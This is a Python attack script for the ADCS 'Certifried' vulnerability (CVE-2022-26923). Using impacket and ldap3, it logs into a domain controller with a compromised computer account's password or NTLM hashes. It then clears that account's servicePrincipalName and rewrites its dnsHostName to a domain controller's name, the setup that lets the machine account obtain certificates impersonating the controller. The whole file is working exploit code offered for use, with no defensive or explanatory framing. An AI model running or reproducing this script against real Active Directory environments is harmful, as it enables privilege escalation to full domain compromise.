#!/usr/bin/env python3
from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_credentials

from dns import resolver
from ldap3.utils.conv import escape_filter_chars

import json
import os
import sys
import argparse
import logging
import ldap3
import ldapdomaindump

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

def clear_spn(ldap_session,dn,username):
    if dn:
        ldap_session.modify(dn, {'servicePrincipalName':[ldap3.MODIFY_REPLACE, []]})
        if ldap_session.result['result'] == 0:
            logging.info(f'{username} servicePrincipalName attribute cleared!')
        else:
            logging.error('Cannot clear servicePrincipalName , Reson {}'.format(ldap_session.result['message']))

def update_dnsHostName(ldap_session,dn,dcfull,username):
    ldap_session.modify(dn, {'dnsHostName':[ldap3.MODIFY_REPLACE, [dcfull]]})
    if ldap_session.result['result'] == 0:
        logging.info(f'{username} dnsHostname attribute updated to {dcfull}') 
    else:
        logging.error('dnsHostname attribute failed to change , Reson {}'.format(ldap_session.result['message']))

def host2ip(hostname, nameserver,dns_timeout,dns_tcp):
    dnsresolver = resolver.Resolver()
    if nameserver:
        dnsresolver.nameservers = [nameserver]
    dnsresolver.lifetime = float(dns_timeout)
    try:
        q = dnsresolver.query(hostname, 'A', tcp=dns_tcp)
        for r in q:
            addr = r.address
        return addr
    except Exception as e:
        logging.error("Resolved Failed: %s" % e)
        return None

def get_user_info(samname, ldap_session, domain_dumper):
    ldap_session.search(domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), 
            attributes=['objectSid','ms-DS-MachineAccountQuota'])
    try:
        et = ldap_session.entries[0]
        js = et.entry_to_json()
        return json.loads(js)
    except IndexError:
        return False

def get_dc_host(ldap_session, domain_dumper,options):
    dc_host = {}
    ldap_session.search(domain_dumper.root, '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', 
            attributes=['name','dNSHostName'])
    if len(ldap_session.entries) > 0:
        for host in ldap_session.entries:
            dc_host[str(host['name'])] = {}
            dc_host[str(host['name'])]['dNSHostName'] = str(host['dNSHostName'])
            host_ip = host2ip(str(host['dNSHostName']), options.dc_ip, 3, True)
            if host_ip:
                dc_host[str(host['name'])]['HostIP'] = host_ip
            else:
                dc_host[str(host['name'])]['HostIP'] = ''
    return dc_host

def modify(username,password,domain,lmhash,nthash,options):
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
    cnf = ldapdomaindump.domainDumpConfig()
    cnf.basepath = None
    domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)

    dn = get_user_info(username, ldap_session, domain_dumper)
    if dn:
        dn = str(dn['dn'])
        logging.info(f'{username} object = {dn}')

    # get dcs
    dcinfo = get_dc_host(ldap_session, domain_dumper,options)

    if len(dcinfo)== 0:
        logging.error("Cannot get domain info")
        exit()
    c_key = 0
    dcs = list(dcinfo.keys())

    dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()

    clear_spn(ldap_session, dn, username)

    update_dnsHostName(ldap_session,dn,dcfull,username)

def init_ldap_connection(target, no_tls, args, domain, username, password, lmhash, nthash):
    user = '%s\\%s' % (domain, username)
    if no_tls:
        use_ssl = False
        port = 389
    else:
        use_ssl = True
        port = 636
    ldap_server = ldap3.Server(target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl)
    if args.hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash):
    if args.dc_ip is not None:
        target = args.dc_ip
    else:
        target = domain
    return init_ldap_connection(target, args.use_ldap, args, domain, username, password, lmhash, nthash)

def parse_identity(args):
    domain, username, password = parse_credentials(args.account)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass
        logging.info("No credentials supplied, supply password")
        password = getpass("Password:")

    if args.hashes is not None:
        hashes = ("aad3b435b51404eeaad3b435b51404ee:".upper() + args.hashes.split(":")[1]).upper()
        lmhash, nthash = hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    return domain, username, password, lmhash, nthash

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "ADCS Certifried (CVE-2022–26923)")
    parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Computer account identity that already compromised')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')

    group = parser.add_argument_group('authentication')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.'
                                                                      'specified in the account parameter will be used')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    domain, username, password, lmhash, nthash = parse_identity(options)

    try:
        if domain is None or domain == '':
            logging.critical('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None:
            from getpass import getpass
            password = getpass("Password:")

        if '$' not in username:
            logging.critical('Please specify computer name to modify its attributes')
            sys.exit(1)

        # Init the example's logger theme
        if options.debug is True:
            logging.getLogger().setLevel(logging.DEBUG)
            # Print the Library's installation path
            logging.debug(version.getInstallationPath())
        else:
            logging.getLogger().setLevel(logging.INFO)
        
        modify(username,password,domain,lmhash,nthash,options)
    
    except ldap3.core.exceptions.LDAPBindError as e:
        logging.error(f"Pls check your account. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
         logging.error(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketSendError as e:
         logging.error(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)

if __name__ == "__main__":
    main()
